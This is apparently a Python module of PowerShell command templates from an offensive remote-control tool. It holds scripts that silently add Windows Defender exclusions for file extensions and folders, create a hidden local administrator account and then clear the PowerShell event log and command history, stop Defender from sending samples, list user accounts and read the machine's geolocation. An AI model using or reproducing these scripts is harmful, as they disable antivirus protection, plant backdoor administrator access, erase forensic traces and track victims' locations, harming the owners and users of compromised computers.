# Available Scripts: geoLocate, addExclusion
# addExclusionScript needs to be formatted with the extension type.



geoLocate = """
Add-Type -AssemblyName System.Device;
$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher;
$GeoWatcher.Start();
while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {Start-Sleep -Milliseconds 100};
if ($GeoWatcher.Permission -eq 'Denied'){Write-Error 'Access Denied for Location Information'} else {$GeoWatcher.Position.Location | Select Latitude,Longitude};
"""

addExtensionExclusionScript = """
Start-Process powershell.exe 'Add-MpPreference -ExclusionExtension \".{}\" ' -WindowStyle Hidden
"""

removeExtensionExclusionScript = """
Start-Process powershell.exe 'Remove-MpPreference -ExclusionExtension \".{}\" ' -WindowStyle Hidden 
"""

getAccounts = """
Get-WmiObject  -Class Win32_UserAccount
"""

addFolderExclusionScript = """
Start-Process powershell.exe 'Add-MpPreference -ExclusionPath \"{}\" ' -WindowStyle Hidden"
"""

removeFolderExclusionScript = """
Start-Process powershell.exe 'Remove-MpPreference -ExclusionPath \"{}\" ' -WindowStyle Hidden"
"""
createAccountScript = """
$pass = ConvertTo-SecureString "{}" -AsPlainText -Force
New-LocalUser "{}" -Password $pass -FullName "{}" -Description "{}";
Add-LocalGroupMember -Group "Administrators" -Member "{}";
Clear-EventLog "Windows PowerShell";
Clear-History;
"""

disableSamplingScript = """
Set-MpPreference  -SubmitSamplesConsent NeverSend
"""